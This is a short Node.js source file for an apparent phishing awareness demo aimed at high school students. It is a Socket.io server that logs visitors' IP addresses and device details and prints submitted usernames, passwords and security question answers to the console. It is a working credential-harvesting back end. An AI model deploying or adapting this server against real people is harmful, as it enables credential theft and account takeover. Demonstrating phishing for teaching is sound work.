// This is a demo, so I'm not going to use SSL here. You can fork it and add SSL if you want to
// use it for some random reason. In my demonstration, this system is sending and receiving data
// through a reverse proxy that is using SSL. Decent for my setup, maybe not for yours.

import express from "express";
import http from "http";
import { Server } from "socket.io";

import UAParser from "ua-parser-js";

// Initialize server information
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    path: "/report/"
});

// Just doing this to test that the is running.
app.get("/", (req, res) => res.send("What a great day to get hacked!"));

// I already know that people are going to spam this server because we're presenting
// to a bunch of high school students and they're going to think they're funny. So,
// I'm going to keep the noise out of the console by only logging unique IP addresses.
const addrCache = new Set();

// Gonna make a session ID map too to tokenize session IDs. They're a little too long
// and they just make a bunch of random crap in the console.
const sidMap = new Map();

io.on("connection", (socket) => {
    const ipAddr = socket.handshake.headers["x-forwarded-for"] ?? socket.handshake.address;
    const hasConnected = addrCache.has(ipAddr);
    
    let pseudoSid = sidMap.get(socket.id);
    if (!pseudoSid) {
        pseudoSid = Math.floor(Math.random() * 1000);
        sidMap.set(socket.id, pseudoSid); // set random pseudosid 0-999
    }

    if (!hasConnected) {
        addrCache.add(ipAddr);
        console.log(`[${pseudoSid}] IP address: ${ipAddr}`);

        const ua = new UAParser(socket.handshake.headers["user-agent"]);
        console.log(`[${pseudoSid}] Browser: ${ua.getBrowser().name ?? "unknown"} ${ua.getBrowser().version ?? "(unknown version)"}`);
        console.log(`[${pseudoSid}] OS: ${ua.getOS().name} ${ua.getOS().version ?? "unknown"}`);
        console.log(`[${pseudoSid}] Device: ${ua.getDevice().vendor ?? "(unknown vendor)"} ${ua.getDevice().model ?? "(unknown model)"}`);
    }

    socket.on("credentials", (data) => {
        console.log(`[${pseudoSid}] Username: ${data.username}`);
        console.log(`[${pseudoSid}] Password: ${data.password}`);
    });

    socket.on("sq", (data) => {
        console.log(`[${pseudoSid}] Security Question: "${data.question}", answered "${data.answer}"`);
    });

    socket.on("disconnect", () => {
        if (!hasConnected)
            console.log(`[${pseudoSid}] Disconnected.`);
        sidMap.delete(socket.id);
    });
});

// Start the server.
server.listen(80, () => console.log("Server is running on port 80."));